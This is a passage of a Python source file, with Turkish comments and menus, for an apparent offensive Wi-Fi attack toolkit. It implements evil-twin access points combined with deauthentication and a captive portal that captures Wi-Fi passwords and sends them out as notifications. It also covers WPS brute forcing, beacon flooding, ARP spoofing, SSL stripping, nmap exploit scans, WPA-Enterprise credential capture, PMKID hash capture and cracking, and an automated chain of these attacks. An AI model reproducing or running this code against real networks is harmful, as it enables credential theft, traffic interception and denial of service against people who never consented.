<body style="background:#1a1a2e;color:#eee;text-align:center;padding-top:40vh;font-family:Arial">
<h2 style="color:#00d4ff">Baglaniliyor...</h2>
<p>Lutfen bekleyiniz.</p>
</body></html>"""

captured_credentials = []
_portal_essid = ""

class CaptivePortalHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): pass  # sessiz

    def do_GET(self):
        # Her isteği giriş sayfasına yönlendir
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        html = CAPTIVE_PORTAL_HTML.replace(
            b'value=""', f'value="{_portal_essid}"'.encode())
        self.wfile.write(html)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length).decode(errors="replace")
        creds  = {}
        for part in body.split("&"):
            if "=" in part:
                k, v = part.split("=", 1)
                creds[unquote_plus(k)] = unquote_plus(v)
        captured_credentials.append(creds)
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        console.print(f"\n  [bold red]KEY CAPTURED [{ts}][/bold red]")
        console.print(f"     SSID  : [cyan]{creds.get('ssid','?')}[/]")
        console.print(f"     Sifre : [yellow]{creds.get('password','?')}[/]")
        log_event("captive_cred", creds)
        send_notification(
            f"Captive Portal — Sifre!\n"
            f"SSID: {creds.get('ssid')}\n"
            f"Sifre: {creds.get('password')}"
        )
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(CAPTIVE_SUCCESS_HTML)

def _evil_twin(ap):
    show_help("evil_twin")
    if not tool_check("hostapd"): return
    if not tool_check("dnsmasq"): return

    global _portal_essid
    essid   = ap["essid"]
    channel = ap["channel"]
    _portal_essid = essid

    captive = safe_input("Captive Portal ekle? [bold](e/h)[/]").strip().lower()

    # hostapd.conf
    hostapd_conf = "\n".join([
        f"interface={INTERFACE}",
        "driver=nl80211",
        f"ssid={essid}",
        "hw_mode=g",
        f"channel={channel}",
        "macaddr_acl=0",
        "ignore_broadcast_ssid=0",
        "auth_algs=1",
    ])
    conf_path = "/tmp/wifway_hostapd.conf"
    Path(conf_path).write_text(hostapd_conf)
    success(f"hostapd.conf → [dim]{conf_path}[/]")

    # dnsmasq.conf — tüm DNS isteklerini 192.168.1.1'e yönlendir
    dnsmasq_conf = "\n".join([
        f"interface={INTERFACE}",
        "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h",
        "dhcp-option=3,192.168.1.1",
        "dhcp-option=6,192.168.1.1",
        "server=8.8.8.8",
        "address=/#/192.168.1.1",
        "log-queries",
        "log-dhcp",
    ])
    dns_path = "/tmp/wifway_dnsmasq.conf"
    Path(dns_path).write_text(dnsmasq_conf)
    success(f"dnsmasq.conf → [dim]{dns_path}[/]")

    # IP ayarla
    subprocess.run(["sudo", "ip", "addr", "add", "192.168.1.1/24",
                    "dev", INTERFACE], capture_output=True)
    subprocess.run(["sudo", "ip", "link", "set", INTERFACE, "up"], capture_output=True)
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
                   stdout=subprocess.DEVNULL)

    # Orijinal AP'yi deauth ile engelle
    info("Orijinal AP deauth ile engelleniyor...")
    deauth_proc = subprocess.Popen(
        ["sudo", "aireplay-ng", "-0", "0", "-a", ap["bssid"], MON_IFACE],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    # hostapd + dnsmasq başlat
    run_command_in_xterm(f"hostapd {conf_path}", f"Evil Twin AP: {essid}", fg="red")
    time.sleep(2)
    run_command_in_xterm(f"dnsmasq -C {dns_path} --no-daemon",
                         "dnsmasq DHCP", fg="yellow")

    if captive == "e":
        info("Captive Portal → http://192.168.1.1:80")
        portal_server = HTTPServer(("0.0.0.0", 80), CaptivePortalHandler)
        portal_thread = threading.Thread(
            target=portal_server.serve_forever, daemon=True)
        portal_thread.start()
        success("Captive Portal aktif — yakalanan şifreler ekranda görünecek.")

    log_event("evil_twin", {"essid": essid, "captive": captive == "e"})

    info("Evil Twin çalışıyor. Durdurmak için [bold]Enter[/bold]'a basın.")
    try: input()
    except KeyboardInterrupt: pass
    deauth_proc.terminate()

    if captive == "e":
        portal_server.shutdown()
        if captured_credentials:
            section("Yakalanan Kimlik Bilgileri")
            for c in captured_credentials:
                console.print(f"  SSID: [cyan]{c.get('ssid','?')}[/]  "
                              f"Şifre: [yellow]{c.get('password','?')}[/]")

    success("Evil Twin durduruldu.")

# ══════════════════════════════════════════════════════════════════════
#  4. WPS
# ══════════════════════════════════════════════════════════════════════

def _wps_attack(ap):
    show_help("wps")
    if not tool_check("reaver"): return
    mode = safe_input("1) Normal reaver  2) Pixie Dust\nSeçiminiz (1/2)").strip()
    if mode == "2":
        cmd   = f"reaver -i {MON_IFACE} -b {ap['bssid']} -c {ap['channel']} -K 1 -vv"
        title = f"WPS Pixie Dust: {ap['essid']}"
    else:
        cmd   = f"reaver -i {MON_IFACE} -b {ap['bssid']} -c {ap['channel']} -vv"
        title = f"WPS Brute-force: {ap['essid']}"
    run_command_in_xterm(cmd, title, fg="yellow", wait=True)
    log_event("wps", {"target": ap["bssid"], "mode": mode})

# ══════════════════════════════════════════════════════════════════════
#  5. BEACON FLOOD
# ══════════════════════════════════════════════════════════════════════

BUILTIN_SSIDS = [
    "Turkcell_Superbox","TurkTelekom_5G","Vodafone_Ev",
    "TP-Link_2.4GHz","Modem_123","Komsu_wifi",
]

def _beacon_flood():
    show_help("beacon")
    if not tool_check("mdk4"): return
    t = Table(box=box.ROUNDED, border_style="dim green", show_header=False)
    t.add_column(style="bold yellow", width=4)
    t.add_column(style="white")
    t.add_row("1", "Artan isimler  (Ev_Wifi_1, Ev_Wifi_2...)")
    t.add_row("2", "Sabit liste    (Turkcell, TurkTelekom, Vodafone...)")
    t.add_row("3", "Rastgele       (xK9mPqR2...)")
    console.print(t)
    mode = safe_input("Seçiminiz (1/2/3)").strip()
    tmp  = "/tmp/wifway_beacon.txt"

    if mode == "1":
        base  = safe_input("Temel ad [dim](örn: Ev_Wifi)[/]").strip()
        count = int(safe_input("Kaç adet?").strip() or "20")
        with open(tmp, "w") as f:
            for i in range(1, count+1): f.write(f"{base}_{i}\n")
        success(f"{count} SSID: {base}_1 → {base}_{count}")
    elif mode == "2":
        with open(tmp, "w") as f:
            f.writelines(s+"\n" for s in BUILTIN_SSIDS)
        success(f"{len(BUILTIN_SSIDS)} sabit SSID.")
    else:
        count = int(safe_input("Kaç adet?").strip() or "50")
        with open(tmp, "w") as f:
            for _ in range(count):
                f.write("".join(random.choices(string.ascii_letters+string.digits, k=8))+"\n")
        success(f"{count} rastgele SSID.")

    run_command_in_xterm(f"mdk4 {MON_IFACE} b -f {tmp}", "Beacon Flood", fg="red")
    log_event("beacon_flood", {"mode": mode})

# ══════════════════════════════════════════════════════════════════════
#  6. OS FİNGERPRİNTİNG
# ══════════════════════════════════════════════════════════════════════

def _os_fingerprint(ap, clients):
    show_help("os_fp")
    if not tool_check("nmap"): return

    if clients:
        info("Bağlı istemciler (MAC adresleri):")
        for i, c in enumerate(clients, 1):
            console.print(f"  [bold yellow]{i}.[/] [cyan]{c['mac']}[/]  {c['probed'] or ''}")
        console.print()

    mode = safe_input(
        "1) Tek IP  2) Subnet  3) Önce ARP tara, sonra seç\nSeçiminiz"
    ).strip()

    if mode == "3":
        subnet = safe_input("Subnet [dim](örn: 192.168.1.0/24)[/]").strip()
        r = subprocess.run(["sudo", "nmap", "-sn", subnet],
                           capture_output=True, text=True)
        console.print(Panel(r.stdout or "Sonuç yok", border_style="dim green"))
        ip = safe_input("Hedef IP").strip()
    else:
        ip = safe_input("Hedef IP / subnet").strip()

    if not ip: warn("IP girilmedi."); return
    cmd = f"nmap -sV -O --osscan-guess --fuzzy -T4 {ip}"
    run_command_in_xterm(cmd, f"OS Fingerprint: {ip}", fg="cyan", wait=True)
    log_event("os_fp", {"target": ip})

# ══════════════════════════════════════════════════════════════════════
#  7. PROBE REQUEST
# ══════════════════════════════════════════════════════════════════════

def _probe_listener():
    show_help("probe")
    if not tool_check("tshark"): return
    cmd = (f"tshark -i {MON_IFACE} -Y 'wlan.fc.type_subtype==0x04' "
           f"-T fields -e wlan.sa -e wlan.ssid 2>/dev/null")
    run_command_in_xterm(cmd, "Probe Request Dinleyici", fg="cyan")
    log_event("probe_listener", {})

# ══════════════════════════════════════════════════════════════════════
#  8. ARP SPOOF
# ══════════════════════════════════════════════════════════════════════

def _arp_spoof():
    show_help("arp")
    if not tool_check("arpspoof"): return
    gateway = safe_input("Gateway IP [dim](örn: 192.168.1.1)[/]").strip()
    target  = safe_input("Hedef IP   [dim](örn: 192.168.1.5)[/]").strip()
    iface   = safe_input(f"Arayüz     [dim](varsayılan: {INTERFACE})[/]").strip() or INTERFACE
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
                   stdout=subprocess.DEVNULL)
    run_command_in_xterm(f"arpspoof -i {iface} -t {target} {gateway}",
                         f"ARP → {target}", fg="red")
    run_command_in_xterm(f"arpspoof -i {iface} -t {gateway} {target}",
                         f"ARP → {gateway}", fg="red")
    log_event("arp_spoof", {"gateway": gateway, "target": target})
    send_notification(f"ARP Spoof aktif: {target} ↔ {gateway}")

# ══════════════════════════════════════════════════════════════════════
#  9. SSL STRIPPING
# ══════════════════════════════════════════════════════════════════════

def _ssl_strip():
    show_help("ssl")
    if not tool_check("sslstrip"): return
    iface = safe_input(f"Arayüz [dim](varsayılan: {INTERFACE})[/]").strip() or INTERFACE
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
                   stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
                    "-p", "tcp", "--destination-port", "80",
                    "-j", "REDIRECT", "--to-port", "8080"],
                   capture_output=True)
    success("iptables: 80 → 8080 yönlendirmesi eklendi.")
    run_command_in_xterm("sslstrip -l 8080 -w /tmp/sslstrip.log",
                         "SSL Strip", fg="red")
    info("Log: [cyan]/tmp/sslstrip.log[/]")
    log_event("ssl_strip", {"interface": iface})

def _ssl_strip_cleanup():
    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"],
                   stdout=subprocess.DEVNULL)
    success("SSL Strip kuralları temizlendi.")

# ══════════════════════════════════════════════════════════════════════
#  10. CVE / ZAFİYET TARAMA
# ══════════════════════════════════════════════════════════════════════

def _cve_scan():
    show_help("cve")
    if not tool_check("nmap"): return
    ip = safe_input("Hedef IP / subnet [dim](örn: 192.168.1.0/24)[/]").strip()
    if not ip: warn("IP girilmedi."); return

    t = Table(box=box.ROUNDED, border_style="dim green", show_header=False)
    t.add_column(style="bold yellow", width=4)
    t.add_column(style="white")
    t.add_row("1", "Hızlı zafiyet tarama      (--script=vuln)")
    t.add_row("2", "Servis + CVE tarama       (--script=vuln,exploit)")
    t.add_row("3", "SMB zafiyet tarama        (EternalBlue vb.)")
    t.add_row("4", "HTTP zafiyet tarama       (XSS, SQLi tespiti)")
    console.print(t)

    choice = safe_input("Seçiminiz").strip()
    cmds = {
        "1": f"nmap -sV --script=vuln -T4 {ip}",
        "2": f"nmap -sV --script=vuln,exploit -T4 {ip}",
        "3": f"nmap -p 445 --script=smb-vuln* -T4 {ip}",
        "4": f"nmap -p 80,443,8080 --script=http-vuln* -T4 {ip}",
    }
    run_command_in_xterm(cmds.get(choice, cmds["1"]),
                         f"CVE Tarama: {ip}", fg="cyan", wait=True)
    log_event("cve_scan", {"target": ip, "type": choice})

# ══════════════════════════════════════════════════════════════════════
#  11. BLUETOOTH TARAMA
# ══════════════════════════════════════════════════════════════════════

def _bluetooth_scan():
    show_help("bluetooth")

    t = Table(box=box.ROUNDED, border_style="dim green", show_header=False)
    t.add_column(style="bold yellow", width=4)
    t.add_column(style="white")
    t.add_row("1", "Klasik BT tara    (bluetoothctl / hcitool scan)")
    t.add_row("2", "BLE tara          (bluetoothctl scan le)")
    t.add_row("3", "Detaylı analiz    (btscanner)")
    t.add_row("4", "L2Ping — varlık doğrula")
    console.print(t)

    choice = safe_input("Seçiminiz").strip()

    if choice == "1":
        # bluetoothctl tercih edilir, hcitool fallback
        if shutil.which("bluetoothctl"):
            info("bluetoothctl ile taranıyor (10 sn)...")
            proc = subprocess.Popen(
                ["sudo", "bluetoothctl"],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                stderr=subprocess.PIPE, text=True
            )
            try:
                out, _ = proc.communicate(
                    input="scan on\n", timeout=12)
            except subprocess.TimeoutExpired:
                proc.kill()
                out, _ = proc.communicate()

            lines = [l for l in out.splitlines() if "Device" in l or "NEW" in l]
            if lines:
                console.print(Panel("\n".join(lines),
                              title="Bulunan BT Cihazlar", border_style="cyan"))
                log_event("bt_scan_classic", {"devices": lines})
            else:
                warn("Klasik BT cihaz bulunamadı.")
        elif shutil.which("hcitool"):
            warn("bluetoothctl yok, hcitool deneniyor...")
            try:
                r = subprocess.run(["sudo", "hcitool", "scan"],
                                   capture_output=True, text=True, timeout=30)
                if r.stdout.strip():
                    console.print(Panel(r.stdout, title="BT Cihazlar",
                                        border_style="cyan"))
                else:
                    warn("Cihaz bulunamadı.")
            except subprocess.TimeoutExpired:
                warn("Zaman aşımı.")
        else:
            error("bluetoothctl veya hcitool bulunamadı. Kurun: sudo apt install bluez -y")

    elif choice == "2":
        if not shutil.which("bluetoothctl"):
            error("bluetoothctl bulunamadı: sudo apt install bluez -y")
            return
        info("BLE taraması başlatılıyor (15 sn)...")
        proc = subprocess.Popen(
            ["sudo", "bluetoothctl"],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.PIPE, text=True
        )
        try:
            out, _ = proc.communicate(input="scan le\n", timeout=17)
        except subprocess.TimeoutExpired:
            proc.kill(); out, _ = proc.communicate()

        lines = [l for l in out.splitlines() if "Device" in l or "NEW" in l]
        if lines:
            console.print(Panel("\n".join(lines),
                          title="BLE Cihazlar", border_style="cyan"))
            log_event("bt_scan_ble", {"devices": lines})
        else:
            warn("BLE cihaz bulunamadı.")

    elif choice == "3":
        if not tool_check("btscanner"):
            return
        run_command_in_xterm("btscanner", "BT Detaylı Analiz", fg="cyan")

    elif choice == "4":
        if not shutil.which("l2ping"):
            error("l2ping bulunamadı: sudo apt install bluez -y")
            return
        mac = safe_input("Hedef BT MAC [dim](örn: AA:BB:CC:DD:EE:FF)[/]").strip()
        if not mac:
            warn("MAC girilmedi.")
            return
        r = subprocess.run(["sudo", "l2ping", "-c", "5", mac],
                            capture_output=True, text=True)
        out = r.stdout or r.stderr
        console.print(Panel(out, title="L2Ping Sonucu", border_style="cyan"))
        log_event("bt_l2ping", {"target": mac, "result": out})

# ══════════════════════════════════════════════════════════════════════
#  12. WPA ENTERPRISE
# ══════════════════════════════════════════════════════════════════════

def _wpa_enterprise():
    show_help("wpa_enterprise")
    if not tool_check("hostapd-wpe"): return
    essid   = safe_input("Hedef ESSID [dim](kurumsal ağ adı)[/]").strip()
    channel = safe_input("Kanal [dim](örn: 6)[/]").strip() or "6"

    conf = "\n".join([
        f"interface={INTERFACE}",
        "driver=nl80211",
        f"ssid={essid}",
        "hw_mode=g",
        f"channel={channel}",
        "wpa=3",
        "wpa_key_mgmt=WPA-EAP",
        "ieee8021x=1",
        "eap_server=1",
        "eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user",
        "ca_cert=/etc/hostapd-wpe/certs/ca.pem",
        "server_cert=/etc/hostapd-wpe/certs/server.pem",
        "private_key=/etc/hostapd-wpe/certs/server.key",
    ])
    conf_path = "/tmp/wifway_wpe.conf"
    Path(conf_path).write_text(conf)
    success(f"hostapd-wpe.conf → [dim]{conf_path}[/]")
    info("Yakalanan hash: [cyan]/var/log/hostapd-wpe.log[/]")
    run_command_in_xterm(f"hostapd-wpe {conf_path}",
                         f"WPA Enterprise: {essid}", fg="red")
    log_event("wpa_enterprise", {"essid": essid})

# ══════════════════════════════════════════════════════════════════════
#  13. KANAL ATLAMA
# ══════════════════════════════════════════════════════════════════════

def _channel_hopping():
    show_help("channel_hop")
    cmd = f"airodump-ng --channel 1,2,3,4,5,6,7,8,9,10,11,12,13 {MON_IFACE}"
    run_command_in_xterm(cmd, "Channel Hopping", fg="cyan")

# ══════════════════════════════════════════════════════════════════════
#  14. WORDLIST ÜRETİCİ
# ══════════════════════════════════════════════════════════════════════

def _wordlist_generator():
    show_help("wordlist")
    essid   = safe_input("Hedef ESSID [dim](boş=atla)[/]").strip()
    keyword = safe_input("Anahtar kelime [dim](ad, şehir vb.)[/]").strip()
    year    = safe_input("Yıl [dim](örn: 2024)[/]").strip()

    bases = [b for b in [essid, keyword] if b]
    if not bases:
        warn("En az bir kelime girin.")
        return

    suffixes = ["","1","12","123","1234","!",".",
                "_wifi","_ev","_home", year]
    prefixes = ["","wifi_","ev_","modem_"]
    words = set()
    for base in bases:
        for pre in prefixes:
            for suf in suffixes:
                w = f"{pre}{base}{suf}"
                if len(w) >= 6:
                    words.update([w, w.lower(), w.upper(), w.capitalize()])

    out = SCAN_DIR / "custom_wordlist.txt"
    words = sorted(words)
    out.write_text("\n".join(words) + "\n")
    success(f"{len(words)} kelime → [cyan]{out}[/]")

    if shutil.which("crunch"):
        ans = safe_input("crunch ile ek liste de ekle? [bold](e/h)[/]").strip().lower()
        if ans == "e":
            crunch_out = str(SCAN_DIR / "crunch_extra.txt")
            subprocess.run(
                ["sudo", "crunch", "8", "10",
                 "abcdefghijklmnopqrstuvwxyz0123456789",
                 "-o", crunch_out],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            success(f"crunch listesi → [cyan]{crunch_out}[/]")

    log_event("wordlist_gen", {"count": len(words), "file": str(out)})
    return str(out)

# ══════════════════════════════════════════════════════════════════════
#  15. SSL STRIP TEMİZLİK
# ══════════════════════════════════════════════════════════════════════

def _ssl_strip_cleanup():
    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"],
                   stdout=subprocess.DEVNULL)
    success("SSL Strip kuralları temizlendi.")

# ══════════════════════════════════════════════════════════════════════
#  16. PMKID
# ══════════════════════════════════════════════════════════════════════

def _pmkid_attack(ap):
    show_help("pmkid")
    if not tool_check("hcxdumptool"): return
    out_file = str(SCAN_DIR / f"pmkid_{ap['bssid'].replace(':','_')}.pcapng")
    cmd = (f"hcxdumptool -i {MON_IFACE} --filterlist_ap={ap['bssid']} "
           f"--filtermode=2 -o {out_file} --active_beacon --enable_status=1")
    run_command_in_xterm(cmd, f"PMKID: {ap['essid']}", fg="yellow")
    info("Yakalama bitti. [bold]Enter[/]'a basın.")
    try: input()
    except KeyboardInterrupt: pass

    hash_file = out_file.replace(".pcapng", ".hc22000")
    subprocess.run(["sudo", "hcxpcapngtool", "-o", hash_file, out_file],
                   capture_output=True)

    if Path(hash_file).exists():
        success(f"Hash hazır: [cyan]{hash_file}[/]")
        log_event("pmkid", {"target": ap["bssid"], "hash": hash_file})
        send_notification(f"PMKID yakalandı: {ap['essid']}")
        ans = safe_input("hashcat ile kır? [bold](e/h)[/]").strip().lower()
        if ans == "e":
            wl = _pick_wordlist()
            if wl:
                run_command_in_xterm(
                    f"hashcat -m 22000 {hash_file} {wl}",
                    f"PMKID Kırma: {ap['essid']}", fg="yellow", wait=True)
    else:
        warn("Hash dosyası oluşturulamadı.")

# ══════════════════════════════════════════════════════════════════════
#  17. OTOMASYON
# ══════════════════════════════════════════════════════════════════════

def _automation_mode():
    show_help("automation")
    aps = do_network_scan()
    if not aps: return
    selected = select_aps(aps)
    if not selected: return

    t = Table(box=box.ROUNDED, border_style="dim green", show_header=False)
    t.add_column(style="bold yellow", width=4)
    t.add_column(style="white")
    t.add_row("1", "Deauth (60 sn)")
    t.add_row("2", "Handshake yakalama + kırma")
    t.add_row("3", "PMKID")
    t.add_row("4", "WPS brute-force")
    t.add_row("5", "OS Fingerprinting")
    console.print(t)

    sel = safe_input("Adımlar [dim](virgülle, örn: 1,2,3)[/]").strip()
    try: steps = [int(x.strip()) for x in sel.split(",")]
    except ValueError: warn("Geçersiz giriş."); return

    for ap in selected:
        section(f"Otomasyon: {ap['essid']}")
        clients = do_client_scan(ap)
        if 1 in steps:
            status("Deauth (60 sn)...")
            p = subprocess.Popen(
                ["sudo","aireplay-ng","-0","0","-a",ap["bssid"],MON_IFACE],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(60); p.terminate()
        if 2 in steps: _handshake_capture(ap, clients)
        if 3 in steps: _pmkid_attack(ap)
        if 4 in steps: _wps_attack(ap)
        if 5 in steps: _os_fingerprint(ap, clients)

    success("Otomasyon tamamlandı.")
    log_event("automation", {"targets": [a["bssid"] for a in selected], "steps": steps})
    send_notification(f"Otomasyon bitti: {[a['essid'] for a in selected]}")

# ══════════════════════════════════════════════════════════════════════
#  TARAMA YARDIMCILARI
# ══════════════════════════════════════════════════════════════════════

def do_network_scan():
    section("Ağ Taraması")
    if not tool_check("airodump-ng"): return []
    status("xterm penceresini [bold]Ctrl+C[/] ile durdurun.")
    cmd  = (f"airodump-ng --write-interval 1 --output-format csv "
            f"--write {CSV_PREFIX} {MON_IFACE}")
    proc = run_command_in_xterm(cmd, "Ağ Taraması")
    try: proc.wait()
    except KeyboardInterrupt:
        try: proc.terminate(); proc.wait(timeout=3)
        except Exception: proc.kill(); proc.wait()

    csv_file = get_latest_csv(timeout=8)
    if not csv_file: error("CSV bulunamadı."); return []
    aps = parse_csv_aps(csv_file)
    if not aps: warn("Ağ bulunamadı."); return []
    list_aps(aps)
    save_scan_history(aps)
    log_event("network_scan", {"count": len(aps)})
    return aps

def do_client_scan(ap):
    section(f"İstemci Taraması — {ap['essid']}")
    prefix = str(SCAN_DIR / f"{ap['bssid'].replace(':','_')}_clients")
    cmd    = (f"airodump-ng --bssid {ap['bssid']} --channel {ap['channel']} "
              f"--output-format csv --write {prefix} {MON_IFACE}")
    cp = run_command_in_xterm(cmd, f"İstemci: {ap['essid']}")
    try: cp.wait()
    except KeyboardInterrupt:
        try: cp.terminate(); cp.wait(timeout=3)
        except Exception: cp.kill(); cp.wait()

    csv_f = get_latest_csv(prefix=prefix, timeout=8)
    if not csv_f: warn("İstemci CSV bulunamadı."); return []
    clients = get_clients_of_ap(csv_f, ap["bssid"])
    if not clients: info("İstemci bulunamadı.")
    else:
        success(f"{len(clients)} istemci.")
        list_clients(clients)
        send_notification(f"İstemci taraması: {ap['essid']} → {len(clients)} cihaz")
    return clients

# ══════════════════════════════════════════════════════════════════════
#  MENÜLER
# ══════════════════════════════════════════════════════════════════════

def menu_network_attacks():
    section("Ağ Hedefli Saldırılar")
    t = Table(box=box.ROUNDED, border_style="dim green", show_header=False)
    t.add_column(style="bold yellow", width=4)
    t.add_column(style="white")
    t.add_row("1", "Yeni tarama yap")
    t.add_row("2", "Kayıtlı taramadan yükle")
    t.add_row("0", "Geri dön")
    console.print(t)
    src = safe_input("Seçiminiz").strip()
    if src == "1":   aps = do_network_scan()
    elif src == "2": aps = load_scan_history()
    else: return
    if not aps: return

    selected = select_aps(aps)
    if not selected: return

    for ap in selected:
        clients = do_client_scan(ap)
        section(f"Saldırı Menüsü — {ap['essid']}")
        t = Table(box=box.ROUNDED, border_style="dim green", show_header=False)
        t.add_column(style="bold yellow", width=4)
        t.add_column(style="white")
        t.add_row("1", "Deauth — Belirli istemciye")
        t.add_row("2", "Deauth — Tüm ağa sınırsız")
        t.add_row("3", "Toplu Deauth — Tüm seçili ağlara")
        t.add_row("4", "Handshake Yakala + Şifre Kır")
        t.add_row("5", "Evil Twin + Captive Portal")
        t.add_row("6", "WPS PIN Saldırısı")
        t.add_row("7", "PMKID Saldırısı")
        t.add_row("8", "WPA Enterprise Saldırısı")
        t.add_row("?", "Bu seçenekler ne yapar? (Yardım)")
        t.add_row("0", "Geri dön")
        console.print(t)
        while True:
            c = safe_input("Seçiminiz").strip()
            if   c == "1": _deauth_client(ap, clients); break
            elif c == "2": _deauth_all(ap); break
            elif c == "3": _bulk_deauth(selected); break
            elif c == "4": _handshake_capture(ap, clients); break
            elif c == "5": _evil_twin(ap); break
            elif c == "6": _wps_attack(ap); break
            elif c == "7": _pmkid_attack(ap); break
            elif c == "8": _wpa_enterprise(); break
            elif c == "?": menu_help()
            elif c == "0": break
            else: warn("Geçersiz seçim.")

def menu_recon():
    section("Keşif & Analiz")
    t = Table(box=box.ROUNDED, border_style="dim green", show_header=False)
    t.add_column(style="bold yellow", width=4)
    t.add_column(style="white")
    t.add_row("1", "OS Fingerprinting")
    t.add_row("2", "Probe Request Dinleme")
    t.add_row("3", "ARP Spoofing / MITM")
    t.add_row("4", "SSL Stripping")
    t.add_row("5", "CVE / Zafiyet Tarama")
    t.add_row("6", "Bluetooth Tarama")
    t.add_row("7", "Kanal Atlama")
    t.add_row("?", "Yardım")
    t.add_row("0", "Geri dön")
    console.print(t)
    c = safe_input("Seçiminiz").strip()
    if   c == "0": return
    elif c == "2": _probe_listener(); return
    elif c == "3": _arp_spoof(); return
    elif c == "4": _ssl_strip(); return
    elif c == "5": _cve_scan(); return
    elif c == "6": _bluetooth_scan(); return
    elif c == "7": _channel_hopping(); return
    elif c == "?": menu_help(); return

    aps = do_network_scan()
    if not aps: return
    selected = select_aps(aps)
    if not selected: return
    for ap in selected:
        clients = do_client_scan(ap)
        if c == "1": _os_fingerprint(ap, clients)

def menu_standalone():
    section("Ağ Bağımsız Araçlar")
    t = Table(box=box.ROUNDED, border_style="dim green", show_header=False)
    t.add_column(style="bold yellow", width=4)
    t.add_column(style="white")
    t.add_row("1", "Beacon Flood")
    t.add_row("2", "MAC Adresi Değiştir")
    t.add_row("3", "MAC Orijinaline Döndür")
    t.add_row("4", "Wordlist Üretici")
    t.add_row("5", "SSL Strip Kurallarını Temizle")
    t.add_row("?", "Yardım")
    t.add_row("0", "Geri dön")
    console.print(t)
    c = safe_input("Seçiminiz").strip()
    if   c == "1": _beacon_flood()
    elif c == "2": change_mac()
    elif c == "3": restore_mac()
    elif c == "4": _wordlist_generator()
    elif c == "5": _ssl_strip_cleanup()
    elif c == "?": menu_help()

def main_menu():
    while True:
        section("Ana Menü")
        t = Table(box=box.ROUNDED, border_style="green", show_header=False)
        t.add_column(style="bold yellow", width=4)
        t.add_column(style="white")
        t.add_row("1", "[bold]Ağ Hedefli Saldırılar[/]  [dim](Deauth, Handshake, Evil Twin, WPS, PMKID, WPA-Ent)[/]")
        t.add_row("2", "[bold]Keşif & Analiz[/]          [dim](OS, Probe, ARP, SSL Strip, CVE, Bluetooth, Hop)[/]")
        t.add_row("3", "[bold]Ağ Bağımsız Araçlar[/]     [dim](Beacon Flood, MAC Spoof, Wordlist)[/]")
        t.add_row("4", "[bold]Otomasyon Modu[/]           [dim](Adımları otomatik çalıştır)[/]")
        t.add_row("5", "[bold]Veri Yönetimi[/]            [dim](Dosya listele / sil)[/]")
        t.add_row("6", "[bold]Bildirim Ayarları[/]        [dim](Telegram / Discord)[/]")
        t.add_row("?", "[bold]Yardım[/]                   [dim](Tüm seçeneklerin açıklaması)[/]")
        t.add_row("0", "Çıkış")
        console.print(t)
        c = safe_input("Seçiminiz").strip()
        if   c == "1": menu_network_attacks()
        elif c == "2": menu_recon()
        elif c == "3": menu_standalone()
        elif c == "4": _automation_mode()
        elif c == "5": menu_data_management()
        elif c == "6": menu_notification_settings()
        elif c == "?": menu_help()
        elif c == "0": return
        else: warn("Geçersiz seçim.")

# ══════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════

def main():
    show_banner()
    if os.geteuid() != 0:
        error("Root yetkisi gerekli.")
        console.print("  Çalıştırın: [bold cyan]sudo python3 wifi_scanner.py[/]")
        sys.exit(1)
    console.print(Align.center("[dim]Başlamak için [bold]Enter[/bold]'a basın...[/]"))
    try: input()
    except KeyboardInterrupt: sys.exit(0)
    try:
        ensure_dirs()
        success(f"Tarama : [cyan]{SCAN_DIR.resolve()}[/]")
        success(f"Loglar  : [cyan]{LOG_DIR.resolve()}[/]")
        enable_monitor_mode()
        main_menu()
        disable_monitor_mode()
        console.print()
        console.print(Panel("[bold green]İyi günler![/]\n[dim]Tüm işlemler tamamlandı.[/]",
                            border_style="green", padding=(1,6)))
    except KeyboardInterrupt:
        warn("Ana Ctrl+C.")
        try:
            ans = safe_input("Çıkmak istiyor musunuz? [bold](e/h)[/]").strip().lower()
        except Exception:
            ans = "e"
        if ans == "e":
            try: disable_monitor_mode()
            except Exception: pass
            console.print(Panel("[bold red]Kapatıldı.[/]", border_style="red"))
    except Exception as e:
        error(f"Beklenmedik hata: {e}")
        try: disable_monitor_mode()
        except Exception: pass
        sys.exit(1)

if __name__ == "__main__":
    main()
